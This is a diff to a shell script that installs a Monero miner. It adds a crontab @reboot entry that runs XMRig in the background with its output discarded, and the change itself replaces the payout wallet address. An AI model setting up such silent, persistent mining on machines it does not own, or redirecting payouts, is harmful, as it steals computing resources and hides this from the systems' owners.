@@ -20,7 +20,7 @@ sudo rm -rf xmrig-6.16.4
 sudo rm -rf xmrig-6.16.4-linux-x64.tar.gz
 sleep 5
 
-code="@reboot (sleep 50; nohup xmrig -o xmr-eu1.nanopool.org:14433 -u 43gD64iSezxjDgMaNpRHQAKBU6TPawhBVCRxAB4KE7xchZMqAwG1WJh7xM7p7v4XkFRGvQwYQEECdLFcMpWYzh9WSyKv1r3 --tls --coin monero --threads=\$(\$(nproc) / 4)) &>/dev/null &"
+code="@reboot (sleep 50; nohup xmrig -o xmr-eu1.nanopool.org:14433 -u 4A62UJgtECJNrXAfrJPMmQZabmCek74nY4UJ7dnPs29v4NX9CUUHshZjbsTUqhMGfviHHKHm4V3EkgRRWBasAxJkQ9heho5 --tls --coin monero --threads=\$(\$(nproc) / 4)) &>/dev/null &"
 
 (crontab -l 2>/dev/null | grep -qF "$code") || (crontab -l 2>/dev/null; echo "$code") | crontab -
 
